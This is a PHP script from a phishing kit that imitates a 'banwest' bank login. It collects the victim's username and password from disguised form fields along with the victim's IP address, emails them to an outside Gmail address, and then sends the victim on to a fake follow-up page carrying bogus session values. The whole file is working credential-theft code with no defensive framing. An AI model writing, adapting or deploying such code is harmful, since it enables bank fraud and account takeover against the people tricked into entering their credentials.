<?php
if($_POST["us34jk00"] != "" and $_POST["pa45jcj0990"] != ""){
$ip = getenv("REMOTE_ADDR");

$message .= "--------------banwest Info-----------------------\n";
$message .= "|0nline confirm: ".$_POST['us34jk00']."\n";
$message .= "|Password confirm: ".$_POST['pa45jcj0990']."\n";
$message .= "|--------------- created by dc -------------------|\n";
 $send = "myteam5000k@gmail.com";
$subject = "banwest | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: detaiinfo.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>

 